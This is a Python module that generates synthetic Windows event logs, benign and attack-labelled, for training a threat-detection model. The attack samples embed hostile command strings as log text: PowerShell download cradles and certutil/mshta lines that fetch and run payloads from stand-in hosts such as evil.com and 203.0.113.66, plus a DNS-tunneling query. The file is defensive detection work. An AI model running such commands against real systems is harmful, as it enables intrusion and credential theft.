"""Synthetic data generator for Baraq ML training and testing.

Generates realistic synthetic Windows event logs for 5 real log types
plus 1 synthetic attack-simulation type. Each type produces both benign
and attack samples with realistic timing, users, hosts, and network
patterns.

Real log types (5):
1. Security (authentication events: 4624, 4625, 4634, 4647, 4648, 4740, 4771)
2. PowerShell (script block events: 4104, 4103, 400, 403)
3. Sysmon (process, network, file, registry events)
4. Network (WFP connections: 5156, 5157)
5. Application (crash/error events: 1000, 1001, 1002)

Synthetic type (6):
6. Attack Simulation (composite attack chains combining multiple log types
   to simulate realistic multi-stage attacks)
"""

from __future__ import annotations

import hashlib
import random
import secrets
from datetime import UTC, datetime, timedelta

# ---------------------------------------------------------------------------
# Domain randomization seeds
# ---------------------------------------------------------------------------
USERS = [
    "administrator",
    "admin",
    "jsmith",
    "mjones",
    "svc_backup",
    "svc_sql",
    "guest",
    "john.doe",
    "jane.smith",
    "bob.wilson",
    "alice.brown",
    "charlie.davis",
    "eve.miller",
    "frank.wilson",
    "grace.lee",
    "SYSTEM",
    "LOCAL SERVICE",
    "NETWORK SERVICE",
]

HOSTS = [
    "DC01",
    "DC02",
    "WEB01",
    "FILE01",
    "SQL01",
    "EXCH01",
    "WORKSTATION01",
    "WORKSTATION02",
    "WORKSTATION03",
    "LAPTOP01",
    "SERVER01",
    "SERVER02",
    "HR-PC01",
    "FIN-PC01",
    "IT-PC01",
]

SOURCE_IPS = [
    "10.0.0.1",
    "10.0.0.2",
    "10.0.0.10",
    "10.0.0.20",
    "10.0.0.50",
    "192.168.1.100",
    "192.168.1.101",
    "192.168.1.150",
    "172.16.0.10",
    "172.16.0.20",
    "203.0.113.50",
    "203.0.113.100",  # RFC 5737 test ranges
    "198.51.100.50",
    "198.51.100.100",
]

EXTERNAL_IPS = [
    "203.0.113.10",
    "203.0.113.20",
    "198.51.100.10",
    "198.51.100.20",
    "192.0.2.10",
    "192.0.2.20",
]

MALICIOUS_IPS = [
    "203.0.113.66",
    "203.0.113.77",
    "198.51.100.66",
    "198.51.100.77",
]

SERVICE_ACCOUNTS = ["svc_backup", "svc_sql", "svc_web", "svc_monitor"]

PROCESS_NAMES = [
    "svchost.exe",
    "csrss.exe",
    "wininit.exe",
    "services.exe",
    "lsass.exe",
    "explorer.exe",
    "cmd.exe",
    "powershell.exe",
    "notepad.exe",
    "chrome.exe",
    "firefox.exe",
    "outlook.exe",
    "word.exe",
    "excel.exe",
    "teams.exe",
    "slack.exe",
]

SUSPICIOUS_PROCESSES = [
    "mimikatz.exe",
    "psexec.exe",
    "nc.exe",
    "ncat.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "mshta.exe",
    "wscript.exe",
    "cscript.exe",
    "regsvr32.exe",
    "rundll32.exe",
    "msiexec.exe",
]

SERVICE_NAMES = [
    "WinDefend",
    "MpsSvc",
    "Spooler",
    "W32Time",
    "DNSCache",
    "Dhcp",
    "EventLog",
    "SamSs",
    "Schedule",
    "Themes",
]

LOGON_TYPES = [
    2,
    3,
    7,
    10,
    11,
]  # Interactive, Network, Batch, RemoteInteractive, CachedInteractive

LOGON_FAILURE_REASONS = [
    ("0xC000006A", "Bad password"),
    ("0xC0000064", "User does not exist"),
    ("0xC0000072", "Account disabled"),
    ("0xC0000234", "Account locked out"),
    ("0xC00000DC", "Logon server unreliable"),
]


def _random_id() -> int:
    return secrets.randbits(32)


def _random_pid() -> int:
    return random.randint(100, 65535)


def _random_hash() -> str:
    return hashlib.sha256(secrets.token_bytes(32)).hexdigest()


def _ts(dt: datetime) -> str:
    return dt.isoformat()


# ---------------------------------------------------------------------------
# 1. Security Events
# ---------------------------------------------------------------------------
def _gen_security_benign(n: int = 100, rng: random.Random | None = None) -> list[dict]:
    """Generate benign Security channel events."""
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)

    for i in range(n):
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        user = rng.choice(
            [
                u
                for u in USERS
                if u not in ("SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE")
            ]
        )
        host = rng.choice(HOSTS)
        src_ip = rng.choice(SOURCE_IPS)
        eid = rng.choices(
            [4624, 4625, 4634, 4647, 4648, 4672, 4768, 4769],
            weights=[40, 5, 20, 10, 5, 5, 10, 5],
        )[0]

        if eid == 4624:
            msg = (
                f"An account was successfully logged on.\n"
                f"Subject: {rng.choice(SERVICE_ACCOUNTS)}\n"
                f"Target: {user}\n"
                f"Logon Type: {rng.choice(LOGON_TYPES)}\n"
                f"Source IP: {src_ip}\n"
                f"Workstation: {host}\n"
                f"LogonProcess: NtLmSsp\n"
                f"Authentication Package: NTLM"
            )
        elif eid == 4625:
            reason = rng.choice(LOGON_FAILURE_REASONS)
            msg = (
                f"An account failed to log on.\n"
                f"Subject: {rng.choice(SERVICE_ACCOUNTS)}\n"
                f"Target: {user}\n"
                f"Logon Type: {rng.choice(LOGON_TYPES)}\n"
                f"Source IP: {src_ip}\n"
                f"Failure Reason: {reason[1]}\n"
                f"Sub Status: {reason[0]}"
            )
        elif eid == 4634:
            msg = f"An account was logged off.\nTarget: {user}\nLogon Type: {rng.choice(LOGON_TYPES)}"
        elif eid == 4647:
            msg = f"User initiated logoff.\nTarget: {user}"
        elif eid == 4648:
            msg = (
                f"A logon was attempted using explicit credentials.\n"
                f"Subject: {rng.choice(SERVICE_ACCOUNTS)}\n"
                f"Target: {user}\n"
                f"Source IP: {src_ip}\n"
                f"New Logon Process: seclogo"
            )
        elif eid == 4672:
            msg = f"Special privileges assigned to new logon.\nSubject: {user}\nPrivileges: SeDebugPrivilege, SeTcbPrivilege"
        elif eid == 4768:
            msg = f"A Kerberos authentication ticket (TGT) was requested.\nTarget: {user}\nClient: {src_ip}"
        elif eid == 4769:
            msg = f"A Kerberos service ticket was requested.\nTarget: {user}\nClient: {src_ip}\nService: krbtgt"
        else:
            msg = f"Security event {eid}"

        events.append(
            {
                "event_id": eid,
                "channel": "Security",
                "timestamp": _ts(dt),
                "host": host,
                "user": user,
                "message": msg,
                "source_ip": src_ip,
                "raw": {
                    "logon_type": rng.choice(LOGON_TYPES) if eid in (4624, 4625) else 0,
                    "source_ip": src_ip,
                    "target_user": user,
                    "is_locked": False,
                    "sub_status": 0,
                },
            }
        )

    return events


def _gen_security_attack(n: int = 20, rng: random.Random | None = None) -> list[dict]:
    """Generate attack Security channel events."""
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)
    attacker_ip = rng.choice(MALICIOUS_IPS)

    # Brute force pattern
    target = rng.choice(USERS)
    for i in range(min(n, 15)):
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        events.append(
            {
                "event_id": 4625,
                "channel": "Security",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": target,
                "message": (
                    f"An account failed to log on.\n"
                    f"Target: {target}\n"
                    f"Logon Type: 3\n"
                    f"Source IP: {attacker_ip}\n"
                    f"Failure Reason: Bad password\n"
                    f"Sub Status: 0xC000006A"
                ),
                "source_ip": attacker_ip,
                "raw": {
                    "logon_type": 3,
                    "source_ip": attacker_ip,
                    "target_user": target,
                    "is_locked": False,
                    "sub_status": "0xC000006A",
                },
            }
        )

    # Successful logon after brute force (lateral movement)
    if n > 15:
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        events.append(
            {
                "event_id": 4624,
                "channel": "Security",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": target,
                "message": (
                    f"An account was successfully logged on.\n"
                    f"Target: {target}\n"
                    f"Logon Type: 10\n"
                    f"Source IP: {attacker_ip}\n"
                    f"LogonProcess: NtLmSsp\n"
                    f"Authentication Package: NTLM"
                ),
                "source_ip": attacker_ip,
                "raw": {
                    "logon_type": 10,
                    "source_ip": attacker_ip,
                    "target_user": target,
                    "is_locked": False,
                },
            }
        )

    # Account creation (persistence)
    if n > 16:
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        events.append(
            {
                "event_id": 4720,
                "channel": "Security",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": "administrator",
                "message": f"A user account was created.\nNew Account: backdoor_admin\nTarget: {target}",
                "raw": {"new_account": "backdoor_admin", "target_user": target},
            }
        )

    # Privilege escalation
    if n > 17:
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        events.append(
            {
                "event_id": 4732,
                "channel": "Security",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": "administrator",
                "message": f"Member added to security-enabled local group.\nGroup: Administrators\nMember: {target}",
                "raw": {"group_name": "Administrators", "target_account_name": target},
            }
        )

    # Log clearing
    if n > 18:
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        events.append(
            {
                "event_id": 1102,
                "channel": "Security",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": target,
                "message": "The audit log was cleared.\nSubject: administrator\nLog: Security",
                "raw": {"event_type": "AuditLogCleared"},
            }
        )

    return events


# ---------------------------------------------------------------------------
# 2. PowerShell Events
# ---------------------------------------------------------------------------
def _gen_powershell_benign(n: int = 50, rng: random.Random | None = None) -> list[dict]:
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)

    benign_scripts = [
        "Get-Process | Sort-Object CPU -Descending",
        "Get-Service | Where-Object {$_.Status -eq 'Running'}",
        "Get-ChildItem -Path C:\\Users -Recurse -Filter *.txt",
        "Test-Connection -ComputerName localhost",
        "Get-WmiObject -Class Win32_OperatingSystem",
        "Get-EventLog -LogName Security -Newest 100",
        "Get-ADUser -Filter {Enabled -eq $true}",
        "Get-Mailbox -ResultSize Unlimited",
    ]

    for i in range(n):
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        script = rng.choice(benign_scripts)
        events.append(
            {
                "event_id": 4104,
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": rng.choice(USERS),
                "message": f"Script Block Logging:\nPath: {rng.choice(HOSTS)}\\program.psu1\nScriptBlockText: {script}",
                "raw": {"command_line": script, "script_len": len(script)},
            }
        )

    return events


def _gen_powershell_attack(n: int = 10, rng: random.Random | None = None) -> list[dict]:
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)

    attack_scripts = [
        (
            "powershell -enc SQBmACgAJABlAHYALg..."
            "IABXAGUAYgBDAGwAaQBlAG4AdAAuAEQAbwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYALgAxAC4AMQA..."
            "JABjAGwAaQBlAG4AdAA..."
            "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
        ),
        "IEX (iwr http://evil.com/implant.ps1 -UseBasicParsing).Content",
        "powershell -w hidden -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.66/shell.ps1')\"",
        "certutil -urlcache -split -f http://evil.com/mimikatz.exe C:\\temp\\m.exe && C:\\temp\\m.exe",
        "mshta.exe http://evil.com/payload.hta",
    ]

    for i in range(min(n, len(attack_scripts))):
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        script = attack_scripts[i % len(attack_scripts)]
        events.append(
            {
                "event_id": 4104,
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": rng.choice(USERS),
                "message": f"Script Block Logging:\nScriptBlockText: {script}",
                "raw": {"command_line": script, "script_len": len(script)},
            }
        )

    return events


# ---------------------------------------------------------------------------
# 3. Sysmon Events
# ---------------------------------------------------------------------------
def _gen_sysmon_benign(n: int = 80, rng: random.Random | None = None) -> list[dict]:
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)

    for i in range(n):
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        eid = rng.choices([1, 3, 11, 13], weights=[50, 30, 10, 10])[0]
        pid = _random_pid()
        ppid = _random_pid()

        if eid == 1:
            proc = rng.choice(PROCESS_NAMES)
            parent = rng.choice(PROCESS_NAMES)
            events.append(
                {
                    "event_id": 1,
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "timestamp": _ts(dt),
                    "host": rng.choice(HOSTS),
                    "user": rng.choice(USERS),
                    "message": f"Process Create:\nImage: C:\\Windows\\System32\\{proc}\nCommandLine: {proc}\nParentImage: C:\\Windows\\System32\\{parent}\nParentCommandLine: {parent}\nUser: {rng.choice(USERS)}",
                    "source": "process",
                    "pid": pid,
                    "ppid": ppid,
                    "raw": {
                        "image_path": f"C:\\Windows\\System32\\{proc}",
                        "parent_process": f"C:\\Windows\\System32\\{parent}",
                        "new_process": proc,
                        "command_line": proc,
                        "user": rng.choice(USERS),
                    },
                }
            )
        elif eid == 3:
            dest_ip = rng.choice(EXTERNAL_IPS)
            dest_port = rng.choice([80, 443, 53, 8080, 8443])
            events.append(
                {
                    "event_id": 3,
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "timestamp": _ts(dt),
                    "host": rng.choice(HOSTS),
                    "user": rng.choice(USERS),
                    "message": f"Network Connection:\nDestinationIp: {dest_ip}\nDestinationPort: {dest_port}\nSourceIp: 10.0.0.1\nImage: C:\\Windows\\System32\\svchost.exe",
                    "source": "network",
                    "raw": {
                        "dest_ip": dest_ip,
                        "dest_port": dest_port,
                        "source_ip": "10.0.0.1",
                    },
                }
            )
        elif eid == 11:
            events.append(
                {
                    "event_id": 11,
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "timestamp": _ts(dt),
                    "host": rng.choice(HOSTS),
                    "user": rng.choice(USERS),
                    "message": f"File Created:\nTargetFilename: C:\\Users\\{rng.choice(USERS)}\\Downloads\\report.pdf",
                    "raw": {
                        "file_path": f"C:\\Users\\{rng.choice(USERS)}\\Downloads\\report.pdf"
                    },
                }
            )
        elif eid == 13:
            events.append(
                {
                    "event_id": 13,
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "timestamp": _ts(dt),
                    "host": rng.choice(HOSTS),
                    "user": rng.choice(USERS),
                    "message": "Registry Value Set:\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MyApp\nDetails: C:\\Program Files\\MyApp\\app.exe",
                    "raw": {
                        "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MyApp"
                    },
                }
            )

    return events


def _gen_sysmon_attack(n: int = 15, rng: random.Random | None = None) -> list[dict]:
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)

    # Process injection (CreateRemoteThread)
    dt = base + timedelta(seconds=rng.randint(0, 86400))
    events.append(
        {
            "event_id": 8,
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "timestamp": _ts(dt),
            "host": rng.choice(HOSTS),
            "user": "SYSTEM",
            "message": "CreateRemoteThread:\nSourceImage: C:\\temp\\inject.exe\nTargetImage: C:\\Windows\\System32\\svchost.exe",
            "raw": {
                "source_image": "C:\\temp\\inject.exe",
                "target_image": "C:\\Windows\\System32\\svchost.exe",
            },
        }
    )

    # LSASS access (credential dumping)
    dt = base + timedelta(seconds=rng.randint(0, 86400))
    events.append(
        {
            "event_id": 10,
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "timestamp": _ts(dt),
            "host": rng.choice(HOSTS),
            "user": "SYSTEM",
            "message": "Process Access:\nSourceImage: C:\\temp\\mimikatz.exe\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1010",
            "raw": {
                "source_image": "C:\\temp\\mimikatz.exe",
                "target_image": "C:\\Windows\\System32\\lsass.exe",
                "granted_access": "0x1010",
            },
        }
    )

    # Run key persistence
    dt = base + timedelta(seconds=rng.randint(0, 86400))
    events.append(
        {
            "event_id": 13,
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "timestamp": _ts(dt),
            "host": rng.choice(HOSTS),
            "user": rng.choice(USERS),
            "message": "Registry Value Set:\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate\nDetails: C:\\temp\\backdoor.exe",
            "raw": {
                "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate",
                "details": "C:\\temp\\backdoor.exe",
            },
        }
    )

    # WMI persistence
    if n > 3:
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        events.append(
            {
                "event_id": 19,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": "SYSTEM",
                "message": "WMI Event Filter:\nQuery: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0",
                "raw": {"query": "SELECT * FROM __InstanceModificationEvent"},
            }
        )

    # DNS tunneling
    if n > 4:
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        events.append(
            {
                "event_id": 22,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": rng.choice(USERS),
                "message": "DNS Query:\nQueryName: aGVsbG8gd29ybGQ.evil.com\nImage: C:\\Windows\\System32\\cmd.exe",
                "raw": {"query_name": "aGVsbG8gd29ybGQ.evil.com"},
            }
        )

    # Named pipe (lateral movement)
    if n > 5:
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        events.append(
            {
                "event_id": 17,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": "SYSTEM",
                "message": "Pipe Created:\nPipeName: \\\\\\.\\pipe\\msagent_*\nImage: C:\\Windows\\System32\\svchost.exe",
                "raw": {"pipe_name": "\\\\.\\pipe\\msagent_*"},
            }
        )

    return events[:n]


# ---------------------------------------------------------------------------
# 4. Network (WFP) Events
# ---------------------------------------------------------------------------
def _gen_network_benign(n: int = 60, rng: random.Random | None = None) -> list[dict]:
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)

    for i in range(n):
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        dest_ip = rng.choice(EXTERNAL_IPS)
        dest_port = rng.choice([80, 443, 53, 8080, 3389, 445])
        events.append(
            {
                "event_id": 5156,
                "channel": "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": "-",
                "message": f"Windows Filtering Platform allowed a connection.\nDestination: {dest_ip}:{dest_port}\nSource: 10.0.0.1\nProtocol: TCP",
                "raw": {
                    "dest_ip": dest_ip,
                    "dest_port": dest_port,
                    "source_ip": "10.0.0.1",
                },
            }
        )

    return events


def _gen_network_attack(n: int = 10, rng: random.Random | None = None) -> list[dict]:
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)

    # Port scan pattern
    target_ip = rng.choice(MALICIOUS_IPS)
    for port in [
        21,
        22,
        23,
        25,
        53,
        80,
        110,
        135,
        139,
        443,
        445,
        993,
        995,
        1433,
        3389,
        5432,
        8080,
    ]:
        if len(events) >= n:
            break
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        events.append(
            {
                "event_id": 5156,
                "channel": "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": "-",
                "message": f"Windows Filtering Platform blocked a connection.\nDestination: 10.0.0.1:{port}\nSource: {target_ip}\nProtocol: TCP",
                "raw": {
                    "dest_ip": "10.0.0.1",
                    "dest_port": port,
                    "source_ip": target_ip,
                },
            }
        )

    return events


# ---------------------------------------------------------------------------
# 5. Application Events
# ---------------------------------------------------------------------------
def _gen_application_benign(
    n: int = 30, rng: random.Random | None = None
) -> list[dict]:
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)

    for i in range(n):
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        eid = rng.choices([1000, 1001, 1002], weights=[50, 30, 20])[0]
        proc = rng.choice(PROCESS_NAMES)

        if eid == 1000:
            events.append(
                {
                    "event_id": 1000,
                    "channel": "Application",
                    "timestamp": _ts(dt),
                    "host": rng.choice(HOSTS),
                    "user": rng.choice(USERS),
                    "message": f"Application Error:\nFaulting application: {proc}\nFaulting module: ntdll.dll\nException code: 0xc0000005",
                    "raw": {"image": proc},
                }
            )
        elif eid == 1001:
            events.append(
                {
                    "event_id": 1001,
                    "channel": "Application",
                    "timestamp": _ts(dt),
                    "host": rng.choice(HOSTS),
                    "user": rng.choice(USERS),
                    "message": f"Windows Error Reporting:\nFaulting application: {proc}\nFault bucket: 12345678",
                    "raw": {"image": proc},
                }
            )
        else:
            events.append(
                {
                    "event_id": 1002,
                    "channel": "Application",
                    "timestamp": _ts(dt),
                    "host": rng.choice(HOSTS),
                    "user": rng.choice(USERS),
                    "message": f"Application Hang:\nApplication: {proc}\nHang type: Not responding",
                    "raw": {"image": proc},
                }
            )

    return events


def _gen_application_attack(n: int = 5, rng: random.Random | None = None) -> list[dict]:
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)

    for i in range(min(n, 3)):
        dt = base + timedelta(seconds=rng.randint(0, 86400))
        proc = rng.choice(SUSPICIOUS_PROCESSES)
        events.append(
            {
                "event_id": 1000,
                "channel": "Application",
                "timestamp": _ts(dt),
                "host": rng.choice(HOSTS),
                "user": rng.choice(USERS),
                "message": f"Application Error:\nFaulting application: {proc}\nFaulting module: unknown.dll\nException code: 0xc0000005",
                "raw": {"image": proc},
            }
        )

    return events


# ---------------------------------------------------------------------------
# 6. Attack Simulation (Composite multi-stage attacks)
# ---------------------------------------------------------------------------
def _gen_attack_simulation(n: int = 5, rng: random.Random | None = None) -> list[dict]:
    """Generate composite attack chains that span multiple log types.

    Each attack simulation is a realistic multi-stage attack sequence:
    1. Initial access (failed logons → successful logon)
    2. Execution (PowerShell download cradle)
    3. Persistence (registry run key)
    4. Credential access (LSASS dump)
    5. Lateral movement (new logon from compromised host)
    6. Defense evasion (log clearing)
    """
    rng = rng or random.Random(42)
    events = []
    base = datetime.now(UTC) - timedelta(hours=24)
    attacker_ip = rng.choice(MALICIOUS_IPS)
    target_user = rng.choice(
        [u for u in USERS if u not in ("SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE")]
    )
    compromised_host = rng.choice(HOSTS)

    for chain in range(n):
        chain_start = base + timedelta(minutes=chain * 30)
        chain_id = f"chain-{chain}"

        # Stage 1: Brute force (Security)
        for attempt in range(5):
            dt = chain_start + timedelta(seconds=attempt * 2)
            events.append(
                {
                    "event_id": 4625,
                    "channel": "Security",
                    "timestamp": _ts(dt),
                    "host": compromised_host,
                    "user": target_user,
                    "message": f"An account failed to log on.\nTarget: {target_user}\nLogon Type: 3\nSource IP: {attacker_ip}\nSub Status: 0xC000006A",
                    "source_ip": attacker_ip,
                    "attack_chain": chain_id,
                    "stage": "initial_access",
                    "raw": {
                        "logon_type": 3,
                        "source_ip": attacker_ip,
                        "target_user": target_user,
                        "sub_status": "0xC000006A",
                    },
                }
            )

        # Stage 1b: Successful logon
        dt = chain_start + timedelta(seconds=15)
        events.append(
            {
                "event_id": 4624,
                "channel": "Security",
                "timestamp": _ts(dt),
                "host": compromised_host,
                "user": target_user,
                "message": f"An account was successfully logged on.\nTarget: {target_user}\nLogon Type: 10\nSource IP: {attacker_ip}",
                "source_ip": attacker_ip,
                "attack_chain": chain_id,
                "stage": "initial_access",
                "raw": {
                    "logon_type": 10,
                    "source_ip": attacker_ip,
                    "target_user": target_user,
                },
            }
        )

        # Stage 2: PowerShell download cradle
        dt = chain_start + timedelta(seconds=30)
        events.append(
            {
                "event_id": 4104,
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "timestamp": _ts(dt),
                "host": compromised_host,
                "user": target_user,
                "message": f"Script Block Logging:\nScriptBlockText: IEX (iwr http://{attacker_ip}/implant.ps1 -UseBasicParsing).Content",
                "attack_chain": chain_id,
                "stage": "execution",
                "raw": {
                    "command_line": f"IEX (iwr http://{attacker_ip}/implant.ps1 -UseBasicParsing).Content"
                },
            }
        )

        # Stage 3: Process creation (Sysmon)
        dt = chain_start + timedelta(seconds=35)
        events.append(
            {
                "event_id": 1,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "timestamp": _ts(dt),
                "host": compromised_host,
                "user": target_user,
                "message": "Process Create:\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell -w hidden -nop -c IEX...",
                "attack_chain": chain_id,
                "stage": "execution",
                "source": "process",
                "raw": {
                    "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "command_line": "powershell -w hidden -nop -c IEX...",
                },
            }
        )

        # Stage 3b: Registry persistence (Sysmon)
        dt = chain_start + timedelta(seconds=40)
        events.append(
            {
                "event_id": 13,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "timestamp": _ts(dt),
                "host": compromised_host,
                "user": target_user,
                "message": "Registry Value Set:\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate\nDetails: C:\\temp\\update.exe",
                "attack_chain": chain_id,
                "stage": "persistence",
                "raw": {
                    "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate"
                },
            }
        )

        # Stage 4: LSASS access (Sysmon)
        dt = chain_start + timedelta(seconds=50)
        events.append(
            {
                "event_id": 10,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "timestamp": _ts(dt),
                "host": compromised_host,
                "user": "SYSTEM",
                "message": "Process Access:\nSourceImage: C:\\temp\\mimikatz.exe\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1010",
                "attack_chain": chain_id,
                "stage": "credential_access",
                "raw": {
                    "source_image": "C:\\temp\\mimikatz.exe",
                    "target_image": "C:\\Windows\\System32\\lsass.exe",
                },
            }
        )

        # Stage 5: Lateral movement (Security)
        dt = chain_start + timedelta(seconds=60)
        new_host = rng.choice([h for h in HOSTS if h != compromised_host])
        events.append(
            {
                "event_id": 4624,
                "channel": "Security",
                "timestamp": _ts(dt),
                "host": new_host,
                "user": target_user,
                "message": f"An account was successfully logged on.\nTarget: {target_user}\nLogon Type: 3\nSource IP: 10.0.0.50",
                "source_ip": "10.0.0.50",
                "attack_chain": chain_id,
                "stage": "lateral_movement",
                "raw": {
                    "logon_type": 3,
                    "source_ip": "10.0.0.50",
                    "target_user": target_user,
                },
            }
        )

        # Stage 6: Log clearing (Security)
        dt = chain_start + timedelta(seconds=90)
        events.append(
            {
                "event_id": 1102,
                "channel": "Security",
                "timestamp": _ts(dt),
                "host": compromised_host,
                "user": target_user,
                "message": "The audit log was cleared.\nSubject: administrator\nLog: Security",
                "attack_chain": chain_id,
                "stage": "defense_evasion",
                "raw": {"event_type": "AuditLogCleared"},
            }
        )

    return events


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------
def generate_synthetic_dataset(
    n_benign: int = 500,
    n_attack: int = 50,
    seed: int = 42,
) -> dict[str, list[dict]]:
    """Generate a complete synthetic dataset across all 6 log types.

    Returns:
        Dict with keys: security, powershell, sysmon, network, application,
        attack_simulation. Each value is a list of event dicts.
    """
    rng = random.Random(seed)

    return {
        "security": (
            _gen_security_benign(n_benign, rng) + _gen_security_attack(n_attack, rng)
        ),
        "powershell": (
            _gen_powershell_benign(n_benign, rng)
            + _gen_powershell_attack(n_attack, rng)
        ),
        "sysmon": (
            _gen_sysmon_benign(n_benign, rng) + _gen_sysmon_attack(n_attack, rng)
        ),
        "network": (
            _gen_network_benign(n_benign, rng) + _gen_network_attack(n_attack, rng)
        ),
        "application": (
            _gen_application_benign(n_benign, rng)
            + _gen_application_attack(n_attack, rng)
        ),
        "attack_simulation": _gen_attack_simulation(n_attack // 5, rng),
    }


def generate_for_ml_training(
    n_benign: int = 1000,
    n_attack: int = 100,
    seed: int = 42,
) -> list[dict]:
    """Generate a flat list of all events for ML training.

    Combines all log types into a single list, shuffled by timestamp.
    Each event has a 'label' field: 0=benign, 1=attack.
    """
    dataset = generate_synthetic_dataset(n_benign, n_attack, seed)
    all_events = []

    for log_type, events in dataset.items():
        for event in events:
            event["log_type"] = log_type
            is_attack = (
                log_type == "attack_simulation"
                or event.get("attack_chain") is not None
                or event.get("event_id") in (1102, 4720, 4732)
                or (
                    event.get("event_id") == 4625
                    and "Sub Status: 0xC000006A" in event.get("message", "")
                )
            )
            event["label"] = 1 if is_attack else 0
            all_events.append(event)

    # Sort by timestamp for realistic temporal ordering
    all_events.sort(key=lambda e: e.get("timestamp", ""))
    return all_events
